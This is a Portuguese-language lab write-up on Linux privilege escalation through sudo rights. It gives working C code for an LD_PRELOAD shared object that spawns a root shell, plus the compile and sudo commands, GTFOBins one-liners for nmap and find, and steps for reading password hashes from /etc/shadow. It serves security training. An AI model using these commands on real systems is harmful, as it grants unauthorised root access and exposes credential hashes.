# Elevação do privilégios: Sudo

Qualquer usuário pode verificar sua situação atual em relação aos privilégios de root usando o sudo -lcomando.

https://gtfobins.github.io/ é uma fonte valiosa que fornece informações sobre como usar qualquer programa no qual você tenha privilégios de sudo.

### Aproveite as funções do aplicativo
Algumas aplicações não terão vulnerabilidades conhecidas nesse contexto. Um exemplo disso é o servidor Apache2.
Carregar o ```/etc/shadow``` arquivo usando esta opção resultará em uma mensagem de erro que inclui a primeira linha do ```/etc/shadow``` arquivo.

### Aproveite LD_PRELOAD
LD_PRELOAD é uma função que permite que qualquer programa utilize bibliotecas compartilhadas. Este artigo fornecerá uma visão geral das funcionalidades do LD_PRELOAD. Se a opção "env_keep" estiver habilitada, podemos gerar uma biblioteca compartilhada que será carregada e executada antes da execução do programa. Observe que a opção LD_PRELOAD será ignorada se o ID de usuário real for diferente do ID de usuário efetivo.

As etapas desse vetor de escalonamento de privilégios podem ser resumidas da seguinte forma:

Verifique se há LD_PRELOAD (com a opção env_keep)
Escreva um código C simples compilado como um arquivo de objeto compartilhado (extensão .so).
Execute o programa com privilégios de sudo e a opção LD_PRELOAD apontando para o nosso arquivo .so.

O código C simplesmente criará um shell com privilégios de root e pode ser escrito da seguinte forma:
>
>#include <stdio.h>
>#include <sys/types.h>
>#include <stdlib.h>
>
>void _init() {
>unsetenv("LD_PRELOAD");
>setgid(0);
>setuid(0);
>system("/bin/bash");
>}

Podemos salvar esse código como shell.c e compilá-lo usando o gcc em um arquivo de objeto compartilhado usando os seguintes parâmetros;

~~~
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
~~~

Agora podemos usar esse arquivo de objeto compartilhado ao executar qualquer programa que nosso usuário possa executar com sudo. No nosso caso, o Apache2, o find ou quase qualquer outro programa que possamos executar com sudo podem ser usados.

Precisamos executar o programa especificando a opção LD_PRELOAD, da seguinte forma;
```
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
```
Isso resultará na criação de um shell com privilégios de root.

How would you use Nmap to spawn a root shell if your user had sudo rights on nmap?
```
sudo nmap --interactive
```
What is the hash of frank's password?

Os hashes de senha geralmente são armazenados no arquivo ```/etc/shadow```. Vamos verificar se podemos acessá-lo com nossos privilégios atuais.
Como esperado, um usuário padrão não pode acessar o arquivo. Precisamos usar os três comandos que identificamos e que podemos executar com privilégios de sudo.

Vamos tentar todos eles.
Primeiro, vamos tentar o comando find.
Vamos consultar o GTFOBins e obter o comando para iniciar um shell root usando o find com privilégios de sudo.

>This function can be performed by any unprivileged user.
```
sudo find . -exec /bin/sh \; -quit
```
